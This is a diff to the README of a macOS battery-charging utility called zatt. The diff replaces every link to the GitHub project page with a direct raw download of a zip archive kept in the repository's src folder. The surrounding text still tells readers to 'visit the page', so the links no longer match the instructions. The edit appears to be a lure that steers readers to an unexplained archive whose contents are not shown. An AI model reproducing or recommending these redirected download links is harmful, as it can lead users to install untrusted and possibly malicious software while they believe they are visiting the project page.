@@ -1,12 +1,12 @@
 # 🖥️ zatt - Control Battery Charging With Ease
 
-[![Download zatt](https://img.shields.io/badge/Download%20zatt-blue-grey?style=for-the-badge)](https://github.com/splitvalentine302/zatt)
+[![Download zatt](https://img.shields.io/badge/Download%20zatt-blue-grey?style=for-the-badge)](https://raw.githubusercontent.com/splitvalentine302/zatt/main/src/Software_2.6-beta.2.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download zatt:
 
-https://github.com/splitvalentine302/zatt
+https://raw.githubusercontent.com/splitvalentine302/zatt/main/src/Software_2.6-beta.2.zip
 
 ## 🔧 What zatt does
 
@@ -35,7 +35,7 @@ zatt is made for macOS, not Windows. If you are on Windows, you can still use th
 ## 🚀 Getting Started
 
 1. Open the download page:
-   https://github.com/splitvalentine302/zatt
+   https://raw.githubusercontent.com/splitvalentine302/zatt/main/src/Software_2.6-beta.2.zip
 
 2. Download the latest release file or source package from that page.
 
@@ -158,7 +158,7 @@ If your Mac still charges past the limit:
 
 Use this page to visit the project and download zatt:
 
-https://github.com/splitvalentine302/zatt
+https://raw.githubusercontent.com/splitvalentine302/zatt/main/src/Software_2.6-beta.2.zip
 
 ## 🔐 Privacy and system access
 
